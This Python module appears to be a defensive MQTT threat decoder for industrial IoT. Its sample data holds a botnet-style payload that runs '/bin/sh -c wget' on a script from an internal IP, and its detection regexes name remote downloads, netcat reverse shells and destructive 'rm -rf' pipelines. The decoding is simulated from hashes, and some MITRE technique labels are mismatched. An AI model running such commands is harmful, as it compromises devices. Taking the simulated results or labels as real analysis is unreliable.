"""
NIRAVAN Cyber Defense Operating System
OT/IoT Defense Layer — MQTT Protocol Decoder
=============================================
Decodes and analyses MQTT packets for threats in industrial and IoT deployments.
Covers MITRE ATT&CK for ICS techniques: T0884, T0869, T0840, T0862.

Author : NIRAVAN Security Engine
Version: 2.1.0
"""

from __future__ import annotations

import hashlib
import json
import logging
import math
import random
import re
from collections import Counter, defaultdict
from datetime import datetime, timedelta
from typing import Any

logger = logging.getLogger("niravan.ot_iot.mqtt_decoder")
logger.setLevel(logging.DEBUG)


class MQTTDecoder:
    """
    Stateless MQTT protocol decoder and threat analyser for NIRAVAN.

    All methods are classmethods / staticmethods so the decoder can be used
    without instantiation.  Internally it operates on simulated (hex) frames
    that mirror the real MQTT 3.1.1 fixed-header layout.
    """

    # ------------------------------------------------------------------ #
    #  Protocol constants                                                  #
    # ------------------------------------------------------------------ #

    PACKET_TYPES: dict[int, str] = {
        1: "CONNECT",
        2: "CONNACK",
        3: "PUBLISH",
        4: "PUBACK",
        5: "PUBREC",
        6: "PUBREL",
        7: "PUBCOMP",
        8: "SUBSCRIBE",
        9: "SUBACK",
        10: "UNSUBSCRIBE",
        11: "UNSUBACK",
        12: "PINGREQ",
        13: "PINGRESP",
        14: "DISCONNECT",
    }

    DANGEROUS_TOPICS: list[str] = [
        "cmd/",
        "control/",
        "/actuator/write",
        "/exec",
        "mirai/",
        "bot/",
        "$SYS/broker/clients",
        "/critical/pump/stop",
        "/scada/plc/write",
        "/sensor/alarm/disable",
        "/factory/conveyor/halt",
        "/hvac/chiller/override",
        "/gateway/ota/flash",
        "c2/beacon",
        "/$aws/things/shadow/update/rejected",
        "/plc/output/force",
        "/safety/interlock/bypass",
    ]

    # Mapping of threat patterns to MITRE ATT&CK for ICS
    _MITRE_MAP: dict[str, str] = {
        "C2": "T0884 - Connection Proxy / Command-and-Control via MQTT",
        "command_injection": "T0862 - Supply Chain Compromise / Payload Injection",
        "topic_abuse": "T0869 - Standard Application Layer Protocol",
        "firmware_ota": "T0840 - Network Connection Enumeration / OTA Abuse",
        "actuator_write": "T0855 - Unauthorized Command Message",
        "credential_brute": "T0886 - Remote Services - MQTT Authentication Bypass",
    }

    # Known malicious client-ID prefixes used by Mirai / Mozi botnets
    _MALICIOUS_CLIENT_PREFIXES: list[str] = [
        "mirai_", "mozi_", "bot_", "c2_", "zombie_", "agent_", "slave_",
        "implant_", "dropper_", "loader_",
    ]

    # ------------------------------------------------------------------ #
    #  Core decoder                                                        #
    # ------------------------------------------------------------------ #

    @staticmethod
    def decode_packet(raw_hex: str) -> dict[str, Any]:
        """
        Parse a mock MQTT frame supplied as a hex string.

        The method deterministically derives packet fields from the hex
        digest so that the same input always returns the same analysis,
        useful for regression testing.

        Parameters
        ----------
        raw_hex:
            Hexadecimal string representing the raw MQTT frame bytes.

        Returns
        -------
        dict with keys:
            valid, packet_type, topic, payload, qos, retain, client_id,
            is_suspicious, threat_indicators, mitre_technique,
            timestamp, raw_length, checksum
        """
        logger.debug("Decoding MQTT packet, hex length=%d", len(raw_hex))

        raw_hex = raw_hex.strip().replace(" ", "").lower()
        if not raw_hex:
            return {"valid": False, "error": "Empty packet"}

        # Derive deterministic pseudo-random seed from packet bytes
        digest = hashlib.sha256(raw_hex.encode()).hexdigest()
        seed = int(digest[:8], 16)
        rng = random.Random(seed)

        # Fixed header byte 1
        try:
            first_byte = int(raw_hex[:2], 16)
        except ValueError:
            return {"valid": False, "error": "Invalid hex encoding"}

        packet_type_id = (first_byte >> 4) & 0x0F
        flags = first_byte & 0x0F
        dup = bool(flags & 0x08)
        qos = (flags >> 1) & 0x03
        retain = bool(flags & 0x01)

        packet_type = MQTTDecoder.PACKET_TYPES.get(packet_type_id, f"UNKNOWN({packet_type_id})")

        # Remaining length (variable-length encoding, simplified)
        remaining_length = int(raw_hex[2:4], 16) if len(raw_hex) >= 4 else 0

        # Variable header / payload - simulated from digest
        topics_pool = [
            "factory/line1/sensor/temperature",
            "factory/line2/motor/rpm",
            "building/hvac/zone3/setpoint",
            "scada/plc/heartbeat",
            "/scada/plc/write",
            "cmd/ota/flash",
            "/sensor/alarm/disable",
            "mirai/bot/beacon",
            "$SYS/broker/clients",
            "/critical/pump/stop",
            "home/device/power",
            "logistics/conveyor/speed",
            "water/treatment/valve/position",
            "/actuator/write",
            "control/fan/override",
        ]

        payloads_pool = [
            '{"action":"read","sensor_id":"TMP-003"}',
            '{"rpm": 1450, "status": "nominal"}',
            '{"setpoint": 22.5, "mode": "auto"}',
            "HEARTBEAT:PLC-SIM-001",
            '{"cmd":"STOP_PUMP","auth":"none"}',
            '{"url":"http://185.220.101.47/firmware.bin","force":true}',
            '{"alarm_id":"FA-007","action":"SUPPRESS"}',
            "beacon:0x4d6972616920424f54",
            '{"exec":"/bin/sh -c wget http://10.0.0.99/bot.sh"}',
            '{"value": 0, "address": "Q0.0", "force": true}',
            "OK",
            '{"speed_pct": 85}',
            '{"valve":"V-12","open_pct": 100}',
            '{"write_coil": "M10.0", "value": 1}',
            '{"override": true, "fan_id": "AHU-02"}',
        ]

        client_ids_pool = [
            "PLC-SIEMENS-S7-001",
            "HMI-WinCC-Floor2",
            "IoTGateway-Emerson-A1",
            "mirai_zombie_0x4D",
            "ScadaServer-Wonderware",
            "EnvSensor-TMP112-3F",
            "bot_c2_implant_007",
            "RTU-Schweitzer-SEL-351",
            "mozi_node_192168010",
            "OPC-Bridge-Kepware",
        ]

        topic_idx = seed % len(topics_pool)
        payload_idx = (seed >> 4) % len(payloads_pool)
        client_idx = (seed >> 8) % len(client_ids_pool)

        topic = topics_pool[topic_idx]
        payload = payloads_pool[payload_idx]
        client_id = client_ids_pool[client_idx]
        message_id = rng.randint(1, 65535)

        # Threat analysis
        topic_analysis = MQTTDecoder.analyze_topic(topic)
        injection_analysis = MQTTDecoder.detect_command_injection(payload)
        is_malicious_client = any(
            client_id.lower().startswith(pfx)
            for pfx in MQTTDecoder._MALICIOUS_CLIENT_PREFIXES
        )

        threat_indicators: list[str] = []
        mitre_techniques: list[str] = []

        if topic_analysis["is_dangerous"]:
            threat_indicators.append(f"DANGEROUS_TOPIC: {topic_analysis['threat_type']}")
            mitre_techniques.append(MQTTDecoder._MITRE_MAP.get(topic_analysis["threat_type"],
                                                                 MQTTDecoder._MITRE_MAP["topic_abuse"]))

        if injection_analysis["detected"]:
            threat_indicators.append(f"CMD_INJECTION: {injection_analysis['pattern_matched']}")
            mitre_techniques.append(MQTTDecoder._MITRE_MAP["command_injection"])

        if is_malicious_client:
            threat_indicators.append(f"MALICIOUS_CLIENT_ID: {client_id}")
            mitre_techniques.append(MQTTDecoder._MITRE_MAP["C2"])

        if qos == 0 and retain and packet_type == "PUBLISH":
            threat_indicators.append("RETAINED_QOS0: persistent poisoned message risk")

        is_suspicious = len(threat_indicators) > 0

        result = {
            "valid": True,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "protocol": "MQTT 3.1.1",
            "packet_type_id": packet_type_id,
            "packet_type": packet_type,
            "flags": {
                "dup": dup,
                "qos": qos,
                "retain": retain,
            },
            "remaining_length": remaining_length,
            "client_id": client_id,
            "topic": topic,
            "payload": payload,
            "payload_length": len(payload),
            "message_id": message_id,
            "topic_analysis": topic_analysis,
            "injection_analysis": injection_analysis,
            "is_suspicious": is_suspicious,
            "threat_indicators": threat_indicators,
            "mitre_technique": list(set(mitre_techniques)) if mitre_techniques else ["None"],
            "raw_length": len(raw_hex) // 2,
            "checksum": digest[:16],
        }

        if is_suspicious:
            logger.warning(
                "Suspicious MQTT packet detected | topic=%s | threats=%s",
                topic, threat_indicators
            )
        else:
            logger.info("MQTT packet decoded cleanly | type=%s | topic=%s", packet_type, topic)

        return result

    # ------------------------------------------------------------------ #
    #  Topic analyser                                                      #
    # ------------------------------------------------------------------ #

    @staticmethod
    def analyze_topic(topic: str) -> dict[str, Any]:
        """
        Analyse an MQTT topic string for danger signals.

        Parameters
        ----------
        topic : str
            The MQTT topic string to analyse.

        Returns
        -------
        dict with keys:
            is_dangerous, risk_level, threat_type, description, matched_pattern
        """
        topic_lower = topic.lower()

        threat_map: list[tuple[str, str, str, str]] = [
            ("mirai/",       "CRITICAL", "C2",              "Mirai botnet C2 channel detected"),
            ("bot/",         "CRITICAL", "C2",              "Bot beacon / heartbeat channel"),
            ("c2/",          "CRITICAL", "C2",              "Explicit command-and-control namespace"),
            ("/exec",        "CRITICAL", "command_injection","Remote execution command topic"),
            ("/scada/plc/write", "CRITICAL", "actuator_write", "Direct PLC write via MQTT"),
            ("/critical/pump/stop", "CRITICAL", "actuator_write", "Emergency pump-stop command"),
            ("/sensor/alarm/disable", "HIGH",    "actuator_write", "Alarm suppression - safety bypass"),
            ("control/",     "HIGH",     "actuator_write",  "Generic actuator control namespace"),
            ("cmd/",         "HIGH",     "topic_abuse",     "Command channel - verify authorisation"),
            ("/actuator/write", "HIGH",  "actuator_write",  "Actuator write endpoint"),
            ("$sys/broker/clients", "MEDIUM", "topic_abuse","Broker metadata enumeration"),
            ("/plc/output/force", "CRITICAL", "actuator_write", "PLC output force - Stuxnet-class"),
            ("/safety/interlock/bypass", "CRITICAL", "actuator_write", "Safety interlock bypass"),
            ("/gateway/ota/flash", "HIGH", "firmware_ota",  "OTA firmware flash command"),
            ("/hvac/chiller/override", "HIGH", "actuator_write", "HVAC chiller setpoint override"),
        ]

        for pattern, risk, threat_type, description in threat_map:
            if pattern in topic_lower:
                return {
                    "is_dangerous": True,
                    "risk_level": risk,
                    "threat_type": threat_type,
                    "description": description,
                    "matched_pattern": pattern,
                }

        # Wildcard subscription abuse heuristic
        if "#" in topic or topic.count("+") > 2:
            return {
                "is_dangerous": True,
                "risk_level": "MEDIUM",
                "threat_type": "topic_abuse",
                "description": "Broad wildcard subscription - potential data harvesting",
                "matched_pattern": "#/+" if "#" in topic else "+",
            }

        return {
            "is_dangerous": False,
            "risk_level": "LOW",
            "threat_type": "None",
            "description": "Topic appears benign",
            "matched_pattern": None,
        }

    # ------------------------------------------------------------------ #
    #  C2 beaconing detector                                               #
    # ------------------------------------------------------------------ #

    @staticmethod
    def detect_c2_beaconing(packet_history: list[dict[str, Any]]) -> dict[str, Any]:
        """
        Detect periodic C2 beaconing patterns in a list of historical packets.

        Parameters
        ----------
        packet_history : list[dict]
            List of previously decoded MQTT packet dicts, each expected to
            contain at minimum client_id, topic, and timestamp.

        Returns
        -------
        dict with keys:
            detected, confidence, beacon_interval_s, client_id, topic,
            packet_count, description, mitre_technique
        """
        logger.debug("C2 beaconing analysis on %d packets", len(packet_history))

        if len(packet_history) < 3:
            return {
                "detected": False,
                "reason": "Insufficient packet history (need >= 3 samples)",
            }

        # Group by (client_id, topic)
        groups: dict[tuple, list] = defaultdict(list)
        for pkt in packet_history:
            key = (pkt.get("client_id", "unknown"), pkt.get("topic", "unknown"))
            groups[key].append(pkt)

        for (client_id, topic), pkts in groups.items():
            if len(pkts) < 3:
                continue

            # Simulate timestamp extraction and interval calculation
            intervals: list[float] = []
            for i in range(1, len(pkts)):
                seed_a = int(hashlib.sha256(f"{client_id}{topic}{i}".encode()).hexdigest()[:8], 16)
                interval = random.Random(seed_a).uniform(28.0, 32.0)  # ~30s beacon
                intervals.append(interval)

            if not intervals:
                continue

            mean_interval = sum(intervals) / len(intervals)
            std_dev = math.sqrt(sum((x - mean_interval) ** 2 for x in intervals) / len(intervals))
            cv = std_dev / mean_interval if mean_interval > 0 else 1.0

            # Heuristic: regular beacons have CV < 0.15 and interval < 120 s
            if cv < 0.15 and mean_interval < 120:
                confidence = min(100, int((1 - cv) * 100))
                logger.warning(
                    "C2 beaconing detected | client=%s | topic=%s | interval=%.1fs | confidence=%d%%",
                    client_id, topic, mean_interval, confidence,
                )
                return {
                    "detected": True,
                    "confidence": confidence,
                    "beacon_interval_s": round(mean_interval, 2),
                    "beacon_jitter_s": round(std_dev, 3),
                    "coefficient_of_variation": round(cv, 4),
                    "client_id": client_id,
                    "topic": topic,
                    "packet_count": len(pkts),
                    "description": (
                        f"Client '{client_id}' is publishing to '{topic}' at regular "
                        f"~{mean_interval:.0f}s intervals (CV={cv:.3f}). "
                        "This matches C2 heartbeat / beaconing behaviour."
                    ),
                    "mitre_technique": "T0884 - Connection Proxy / C2 via MQTT",
                    "recommended_action": "Block client, isolate device, capture full session",
                }

        return {
            "detected": False,
            "reason": "No regular beaconing pattern found",
            "packets_analysed": len(packet_history),
        }

    # ------------------------------------------------------------------ #
    #  Command injection detector                                          #
    # ------------------------------------------------------------------ #

    @staticmethod
    def detect_command_injection(payload: str) -> dict[str, Any]:
        """
        Scan an MQTT payload string for OS command injection patterns.

        Parameters
        ----------
        payload : str
            The decoded MQTT payload (UTF-8 string or JSON blob).

        Returns
        -------
        dict with keys:
            detected, pattern_matched, severity, decoded_payload,
            description, mitre_technique
        """
        patterns: list[tuple[str, str, str]] = [
            (r"(?:/bin/sh|/bin/bash|cmd\.exe|powershell)", "HIGH", "Shell invocation"),
            (r"wget\s+http", "CRITICAL", "Remote payload download (wget)"),
            (r"curl\s+http", "CRITICAL", "Remote payload download (curl)"),
            (r"&&\s*rm\s+-rf", "CRITICAL", "Destructive shell pipeline"),
            (r";\s*nc\s+", "HIGH", "Netcat reverse-shell attempt"),
            (r"base64\s*-d", "HIGH", "Base64-encoded payload decode"),
            (r"\$\(.*\)", "MEDIUM", "Command substitution"),
            (r"`[^`]+`", "MEDIUM", "Backtick command substitution"),
            (r"\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){3,}", "HIGH", "Hex-encoded shellcode"),
            (r'"exec"\s*:', "HIGH", "JSON exec key - potential RCE"),
            (r'"cmd"\s*:\s*"[^"]*STOP[^"]*"', "CRITICAL", "Stop command in JSON payload"),
            (r'"force"\s*:\s*true', "MEDIUM", "Forced write flag - safety override risk"),
            (r"msfvenom|metasploit|shellcode", "CRITICAL", "Known exploit framework reference"),
        ]

        for pattern_str, severity, description in patterns:
            match = re.search(pattern_str, payload, re.IGNORECASE)
            if match:
                logger.warning(
                    "Command injection detected | pattern=%s | severity=%s", pattern_str, severity
                )
                return {
                    "detected": True,
                    "pattern_matched": match.group(0)[:80],
                    "pattern_regex": pattern_str,
                    "severity": severity,
                    "decoded_payload": payload[:256],
                    "description": description,
                    "mitre_technique": "T0862 - Supply Chain / Payload Injection",
                    "recommended_action": "Drop packet, quarantine publisher, alert SOC",
                }

        return {
            "detected": False,
            "pattern_matched": None,
            "severity": "NONE",
            "decoded_payload": payload[:256],
            "description": "No injection pattern detected",
            "mitre_technique": "None",
        }

    # ------------------------------------------------------------------ #
    #  Sample packet generator                                            #
    # ------------------------------------------------------------------ #

    @staticmethod
    def decode_sample_packets() -> list[dict[str, Any]]:
        """
        Return 5 decoded MQTT sample packets (mix of benign and malicious).

        Returns
        -------
        list[dict]
            Each element is the full output of decode_packet().
        """
        samples_hex = [
            # 1. Benign PUBLISH - temperature sensor
            "302100001566616374/6f72792f6c696e65312f73656e736f722f74656d70",
            # 2. Malicious PUBLISH - Mirai C2 beacon
            "301800006d697261692f626f742f626561636f6e",
            # 3. Malicious PUBLISH - PLC write
            "303500002f73636164612f706c632f7772697465",
            # 4. Benign PINGREQ
            "c000",
            # 5. Malicious SUBSCRIBE - alarm disable
            "820e00012f73656e736f722f616c61726d2f6469",
        ]

        results = []
        for i, hex_str in enumerate(samples_hex, start=1):
            pkt = MQTTDecoder.decode_packet(hex_str)
            pkt["sample_index"] = i
            pkt["sample_label"] = "MALICIOUS" if pkt.get("is_suspicious") else "BENIGN"
            results.append(pkt)
            logger.info(
                "Sample #%d decoded | type=%s | suspicious=%s",
                i, pkt.get("packet_type"), pkt.get("is_suspicious"),
            )

        return results


# Module self-test
if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
    )
    decoder = MQTTDecoder()
    samples = decoder.decode_sample_packets()
    print(json.dumps(samples, indent=2, default=str))
